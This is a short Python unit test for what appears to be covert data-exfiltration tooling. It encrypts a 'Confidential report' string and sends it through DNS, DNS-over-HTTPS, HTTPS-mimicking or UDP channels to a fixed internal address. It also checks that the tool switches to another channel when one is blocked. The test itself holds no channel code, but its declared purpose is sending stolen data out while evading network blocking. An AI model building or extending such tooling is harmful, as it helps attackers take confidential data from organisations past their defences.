import unittest
import random
from encryption import SecureEncryption
from dns_traffic_simulation import DNSProtocol
from https_mimic import HTTPSProtocol
from doh_tunnel import DoHProtocol
from udp import UDPProtocol

class TestProtocolSwitching(unittest.TestCase):
    def setUp(self):
        """Setup encryption and protocols"""
        self.encryption = SecureEncryption()
        self.test_data = "Confidential report"
        
        self.protocols = {
            "DNS": DNSProtocol("exfiltrate", "192.168.1.100"),
            "HTTPS": HTTPSProtocol("exfiltrate", "192.168.1.100"),
            "DOH": DoHProtocol("exfiltrate"),
            "UDP": UDPProtocol("exfiltrate", "192.168.1.100")
        }
    
    def test_protocol_switching(self):
        """Test if protocols switch when blocked"""
        selected_protocol = random.choice(list(self.protocols.keys()))
        encrypted_data = self.encryption.encrypt(self.test_data, use_chacha=(selected_protocol == "UDP"))

        success = self.protocols[selected_protocol].transmit(encrypted_data)

        if not success:
            new_protocol = "HTTPS" if selected_protocol == "DNS" else "DNS"
            success = self.protocols[new_protocol].transmit(encrypted_data)

        self.assertTrue(success)

if __name__ == "__main__":
    unittest.main()
